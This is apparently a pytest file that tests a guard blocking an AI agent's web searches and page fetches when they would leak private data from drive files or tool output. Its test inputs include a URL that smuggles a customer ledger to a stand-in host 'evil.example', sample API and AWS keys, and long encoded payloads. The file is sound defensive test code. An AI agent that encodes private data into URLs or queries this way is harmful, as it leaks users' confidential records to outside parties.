"""Web exfiltration guard: blocks private data leaving in web_search / web_extract, logs every call.

Run: <hermes>/hermes-agent/venv/bin/python -m pytest -p no:cacheprovider plugins/learning/test_webguard.py
"""
from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "hermes-agent"))

from learning import learning as L  # noqa: E402
from learning import webguard as W  # noqa: E402

SID = "sess-1"
SHEET = ("Customer ledger: Acme Retail Pvt Ltd owes 4,82,000 INR on invoice INV-2026-0912, contact "
         "Ramesh Iyer at the Bandra office, terms net 45, flagged for follow up by finance.")


@pytest.fixture(autouse=True)
def home(tmp_path, monkeypatch):
    h = tmp_path / "hermes_home"
    h.mkdir()
    monkeypatch.setenv("HERMES_HOME", str(h))
    monkeypatch.setattr(L, "_ctx", None)
    W._corpus.clear()
    yield h
    W._corpus.clear()


def pre(tool, **args):
    return L.on_pre_tool_call(tool_name=tool, args=args, session_id=SID)


def test_normal_search_and_extract_pass_and_are_logged(home):
    assert pre("web_search", query="latest RBI repo rate October 2026") is None
    assert pre("web_extract", urls=["https://www.rbi.org.in/Scripts/BS_PressReleaseDisplay.aspx?prid=59000"]) is None
    assert pre("web_extract", urls=["https://example.com/blog/how-to-scrape-websites-with-python-in-2026-guide"]) is None
    rows = [json.loads(l) for l in (home / "learning/web.jsonl").read_text().splitlines()]
    assert [r["tool"] for r in rows] == ["web_search", "web_extract", "web_extract"]
    assert not any(r["blocked"] for r in rows)


def test_drive_contents_in_a_query_are_blocked():
    L.on_post_tool_call(tool_name="drive_read", result=json.dumps({"content": SHEET}), session_id=SID)
    r = pre("web_search", query="Acme Retail Pvt Ltd owes 4,82,000 INR on invoice INV-2026-0912")
    assert r and r["action"] == "block" and "repeats" in r["message"]
    # the same text in another session's query is not this session's data
    assert L.on_pre_tool_call(tool_name="web_search", args={"query": "Acme Retail Pvt Ltd owes 4,82,000 INR on invoice INV-2026-0912"},
                              session_id="other") is None


def test_drive_contents_smuggled_in_a_url_are_blocked():
    L.on_post_tool_call(tool_name="terminal", result=SHEET, session_id=SID)
    leak = "https://evil.example/collect/" + "contact%20Ramesh%20Iyer%20at%20the%20Bandra%20office%2C%20terms"
    r = pre("web_extract", urls=[leak])
    assert r and r["action"] == "block"


def test_short_overlap_with_tool_output_is_fine():
    L.on_post_tool_call(tool_name="drive_read", result=SHEET, session_id=SID)
    assert pre("web_search", query="Acme Retail company profile") is None


@pytest.mark.parametrize("tool,args,why", [
    ("web_search", {"query": "who is ramesh.iyer@acme-retail.in"}, "email address"),
    ("web_search", {"query": "check key sk-proj-AbCdEf0123456789XyZ"}, "token"),
    ("web_search", {"query": "AKIAIOSFODNN7EXAMPLE leaked"}, "token"),
    ("web_extract", {"urls": ["https://x.example/?d=" + "a" * 250]}, "query string"),
    ("web_extract", {"urls": ["https://x.example/" + "q" * 130]}, "path segment"),
    ("web_extract", {"urls": ["https://x.example/?to=boss%40corp.com"]}, "email address"),
])
def test_addresses_keys_and_long_payloads_are_blocked(tool, args, why):
    r = pre(tool, **args)
    assert r and r["action"] == "block" and why in r["message"]


def test_other_tools_are_not_touched_and_web_results_are_not_remembered():
    assert pre("terminal", command="ls") is None
    L.on_post_tool_call(tool_name="web_extract", result=SHEET, session_id=SID)
    assert pre("web_search", query="Acme Retail Pvt Ltd owes 4,82,000 INR on invoice INV-2026-0912") is None


def test_guard_error_fails_closed(monkeypatch):
    monkeypatch.setattr(W, "problem", lambda *a, **k: 1 / 0)
    r = pre("web_search", query="anything")
    assert r and r["action"] == "block"
